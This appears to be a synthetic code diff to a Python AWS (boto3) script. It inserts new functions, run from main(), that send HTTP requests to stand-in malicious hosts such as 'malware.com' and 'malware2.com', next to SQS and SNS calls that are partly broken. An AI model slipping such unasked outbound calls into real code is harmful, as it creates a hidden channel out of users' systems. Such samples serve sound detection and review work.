@@ -31,3 +31,24 @@ def main():
     session = boto3.Session(region_name = 'us-west-2')
     backup_s3 = session.resource('s3')
     lam = session.client('lambda')
+    test()
+
+def test():
+    print("test")
+    db = boto3.client('dynamodb')
+    response = requests.get('https://www.malware.com', data={'q': 'python'})
+
+def test2():
+    print("test2")
+    queue = boto3.client('sqs')
+    response = requests.post('https://www.malware2.com', data={'q': 'python'})
+    with open('sqs.txt', 'r') as data:
+        queue.send_message(QueueUrl='https://sqs.us-west-2.amazonaws.com/123456789012/MyQueue', MessageBody=data)
+
+def main2():
+    sns = boto3.client('sns')
+    response = requests.get('https://www.googlemain2.com', data={'q': 'python'})
+    res = sns.publish(TopicArn='arn:aws:sns:us-west-2:123456789012:MyTopic', Message='Hello World')
+    with open('sns_log.txt', 'w') as data:
+        data.write(res)
+    test2()
